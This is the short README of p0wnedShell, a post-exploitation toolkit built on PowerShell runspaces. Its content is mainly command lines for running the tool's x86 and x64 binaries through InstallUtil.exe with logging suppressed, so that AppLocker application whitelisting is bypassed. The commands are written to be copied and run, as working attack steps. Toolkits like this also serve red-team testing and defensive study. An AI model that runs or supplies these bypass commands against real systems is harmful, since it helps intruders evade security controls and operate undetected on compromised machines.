# p0wnedShell
PowerShell Runspace Post Exploitation Toolkit 

#Author: <Cneeliz>

License: BSD 3-Clause

To run as x86 binary and bypass Applocker:

cd \Windows\Microsoft.NET\Framework\v4.0.30319 (Or newer .NET version folder)

InstallUtil.exe /logfile= /LogToConsole=false /U C:\p0wnedShell\p0wnedShellx86.exe

To run as x64 binary and bypass Applocker:

cd \Windows\Microsoft.NET\Framework64\v4.0.30319 (Or newer .NET version folder)

InstallUtil.exe /logfile= /LogToConsole=false /U C:\p0wnedShell\p0wnedShellx64.exe
